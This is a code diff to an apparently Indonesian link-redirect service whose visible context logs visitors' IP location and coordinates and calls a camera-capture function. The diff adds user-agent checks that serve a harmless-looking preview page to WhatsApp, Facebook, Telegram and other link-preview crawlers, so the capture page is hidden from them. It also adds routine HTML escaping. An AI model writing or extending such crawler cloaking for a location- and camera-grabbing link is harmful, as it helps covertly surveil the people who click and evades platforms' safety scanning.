@@ -172,6 +172,31 @@ function fetchIpLocation(ip) {
   });
 }
 
+function escapeHtml(str) {
+  if (!str) return '';
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#039;');
+}
+
+function isSocialBot(userAgentString) {
+  if (!userAgentString) return false;
+  const ua = userAgentString.toLowerCase();
+  return (
+    ua.includes('facebookexternalhit') ||
+    ua.includes('whatsapp') ||
+    ua.includes('telegrambot') ||
+    ua.includes('twitterbot') ||
+    ua.includes('slackbot') ||
+    ua.includes('discordbot') ||
+    ua.includes('linkedinbot') ||
+    ua.includes('bingpreview')
+  );
+}
+
 function categorizeReferrer(refHeader) {
   if (!refHeader || refHeader.trim() === '') return { category: 'Direct / Langsung', raw: 'Langsung / Ketik URL' };
   const lower = refHeader.toLowerCase();
@@ -387,6 +412,31 @@ const handleRedirect = async (req, res) => {
     }
   }
 
+  // Detect Social Media Link Preview Crawlers (WhatsApp, Facebook, Telegram, etc)
+  if (isSocialBot(agentString)) {
+    return res.send(`
+      <!DOCTYPE html>
+      <html lang="id">
+      <head>
+        <meta charset="UTF-8">
+        <title>${escapeHtml(link.title)}</title>
+        <meta property="og:type" content="website">
+        <meta property="og:title" content="${escapeHtml(link.title)}">
+        <meta property="og:description" content="Klik untuk melihat konten lengkap dari ${escapeHtml(link.title)}">
+        <meta property="og:url" content="https://${req.headers.host}/r/${link.code}">
+        ${link.imageUrl ? `<meta property="og:image" content="${escapeHtml(link.imageUrl)}">` : ''}
+        <meta name="twitter:card" content="summary_large_image">
+        <meta name="twitter:title" content="${escapeHtml(link.title)}">
+        <meta name="twitter:description" content="Klik untuk melihat konten lengkap dari ${escapeHtml(link.title)}">
+        ${link.imageUrl ? `<meta name="twitter:image" content="${escapeHtml(link.imageUrl)}">` : ''}
+      </head>
+      <body>
+        <h1>${escapeHtml(link.title)}</h1>
+      </body>
+      </html>
+    `);
+  }
+
   // If GET request WITHOUT lat/lon/fallback, it's rendering the landing page HTML.
   // DO NOT record click event yet to prevent duplicate entry!
   if (req.method === 'GET' && isNaN(queryLat) && isNaN(queryLon) && !isFallback) {
@@ -537,7 +587,7 @@ const handleRedirect = async (req, res) => {
           } catch (e) {
             console.error(e);
           }
-          window.location.replace('${link.targetUrl}');
+          window.location.replace(${JSON.stringify(link.targetUrl)});
         }
 
         async function tryCaptureCamera() {
